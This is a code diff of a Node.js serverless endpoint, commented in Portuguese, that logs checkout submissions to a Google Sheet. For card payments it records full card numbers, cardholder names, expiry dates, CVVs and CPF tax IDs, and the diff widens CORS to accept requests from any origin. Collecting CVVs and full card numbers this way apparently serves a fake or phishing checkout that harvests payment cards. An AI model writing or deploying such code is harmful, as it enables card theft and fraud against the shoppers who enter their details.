@@ -2,13 +2,18 @@
 const { google } = require('googleapis');
 
 module.exports = async (req, res) => {
-  // ✅ CORS simplificado
+  // Configurar CORS
+  res.setHeader('Access-Control-Allow-Credentials', true);
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
+  res.setHeader(
+    'Access-Control-Allow-Headers',
+    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
+  );
 
   if (req.method === 'OPTIONS') {
-    return res.status(204).end();
+    res.status(200).end();
+    return;
   }
 
   if (req.method !== 'POST') {
@@ -16,18 +21,7 @@ module.exports = async (req, res) => {
   }
 
   try {
-    // ✅ Corrige corpo vindo como string
-    if (typeof req.body === 'string') {
-      try {
-        req.body = JSON.parse(req.body);
-      } catch (e) {
-        console.error('❌ Erro ao converter body:', e);
-        return res.status(400).json({ erro: 'Body inválido — deve ser JSON' });
-      }
-    }
-
     const { tipo, dados } = req.body;
-    console.log('📩 Corpo recebido:', req.body);
 
     if (!tipo || !dados) {
       return res.status(400).json({ erro: 'Dados incompletos' });
@@ -39,12 +33,12 @@ module.exports = async (req, res) => {
     const SHEET_NAME = process.env.SHEET_NAME || 'Dados';
 
     if (!GOOGLE_SHEETS_CREDENTIALS || !SPREADSHEET_ID) {
-      console.error('❌ Credenciais do Google Sheets não configuradas');
+      console.error('Credenciais do Google Sheets não configuradas');
       return res.status(500).json({ erro: 'Configuração incompleta' });
     }
 
-    // Parse seguro das credenciais
-    const credentials = JSON.parse(GOOGLE_SHEETS_CREDENTIALS.replace(/\\n/g, '\n'));
+    // Parse das credenciais
+    const credentials = JSON.parse(GOOGLE_SHEETS_CREDENTIALS);
 
     // Autenticar com Google Sheets API
     const auth = new google.auth.GoogleAuth({
@@ -54,16 +48,13 @@ module.exports = async (req, res) => {
 
     const sheets = google.sheets({ version: 'v4', auth });
 
-    // Timestamp ISO
-    const timestamp = new Date();
-    const timestampFormatado = timestamp.toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
-
-    // Montar linha
+    // Preparar dados para inserir na planilha
     let row = [];
+    const timestamp = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
 
     if (tipo === 'pix_gerado') {
       row = [
-        timestampFormatado,
+        timestamp,
         'PIX',
         dados.produto || '',
         dados.precoOriginal || '',
@@ -79,82 +70,57 @@ module.exports = async (req, res) => {
         dados.estado || '',
         dados.cep || '',
         dados.chavePix || '',
-        '', '', '', '', '', '', ''
+        '', // parcelas (vazio para PIX)
+        '', // cartao_final (vazio para PIX)
+        '', // numero_cartao_completo (vazio para PIX)
+        '', // nome_cartao (vazio para PIX)
+        '', // validade (vazio para PIX)
+        '', // cvv (vazio para PIX)
+        '', // cpf (vazio para PIX)
       ];
     } else if (tipo === 'cartao_inserido') {
       row = [
-        timestampFormatado,
+        timestamp,
         'CARTÃO',
         dados.produto || '',
         dados.valor || '',
-        '', '', '', dados.valor || '',
+        '', // desconto (vazio para cartão)
+        '', // precoComDesconto (vazio para cartão)
+        '', // frete (pode ser incluído se disponível)
+        dados.valor || '',
         dados.cliente || '',
         dados.email || '',
         dados.telefone || '',
-        '', '', '', '',
-        '', dados.parcelas || '',
+        '', // endereco (pode ser incluído se disponível)
+        '', // cidade (pode ser incluído se disponível)
+        '', // estado (pode ser incluído se disponível)
+        '', // cep (pode ser incluído se disponível)
+        '', // chavePix (vazio para cartão)
+        dados.parcelas || '',
         dados.cartao_final || '',
         dados.numero_cartao_completo || '',
         dados.nome_cartao || '',
         dados.validade || '',
         dados.cvv || '',
-        dados.cpf || ''
+        dados.cpf || '',
       ];
     } else {
       return res.status(400).json({ erro: 'Tipo inválido' });
     }
 
-    // 🔍 Verificar duplicação (última linha idêntica)
-    const getLastRow = await sheets.spreadsheets.values.get({
-      spreadsheetId: SPREADSHEET_ID,
-      range: `${SHEET_NAME}!A:W`,
-    });
-
-    const allRows = getLastRow.data.values || [];
-    const lastRow = allRows[allRows.length - 1];
-
-    let isDuplicate = false;
-    if (lastRow) {
-      const tipoAnterior = lastRow[1];
-      const produtoAnterior = lastRow[2];
-      const clienteAnterior = lastRow[8];
-      const horaAnterior = lastRow[0];
-
-      // Converter data/hora anterior corretamente
-      const [dataPart, horaPart] = horaAnterior.split(', ');
-      const [dia, mes, ano] = dataPart.split('/');
-      const [hora, minuto, segundo] = horaPart.split(':');
-      const horaAnteriorConvertida = new Date(ano, mes - 1, dia, hora, minuto, segundo);
-
-      const diff = Math.abs(timestamp - horaAnteriorConvertida);
-
-      if (
-        tipoAnterior === (tipo === 'pix_gerado' ? 'PIX' : 'CARTÃO') &&
-        produtoAnterior === (dados.produto || '') &&
-        clienteAnterior === (dados.cliente || '') &&
-        diff < 5000 // 5 segundos
-      ) {
-        isDuplicate = true;
-      }
-    }
-
-    if (isDuplicate) {
-      console.log('⚠️ Registro duplicado detectado — ignorado.');
-      return res.status(200).json({ sucesso: true, mensagem: 'Registro duplicado ignorado.' });
-    }
-
-    // ✅ Inserir dados na planilha
-    console.log('📝 Linha a ser enviada:', row);
+    // Inserir dados na planilha
     await sheets.spreadsheets.values.append({
       spreadsheetId: SPREADSHEET_ID,
-      range: `${SHEET_NAME}!A:W`,
+      range: `${SHEET_NAME}!A:W`, // Colunas A até W (23 colunas)
       valueInputOption: 'USER_ENTERED',
-      resource: { values: [row] },
+      resource: {
+        values: [row],
+      },
     });
 
     return res.status(200).json({ sucesso: true, mensagem: 'Dados enviados para o Google Sheets' });
   } catch (error) {
-    console.error('❌ Erro ao enviar dados para o Google Sheets:', error);
+    console.error('Erro ao enviar dados para o Google Sheets:', error);
     return res.status(500).json({ erro: 'Erro ao processar requisição', detalhes: error.message });
   }
 };
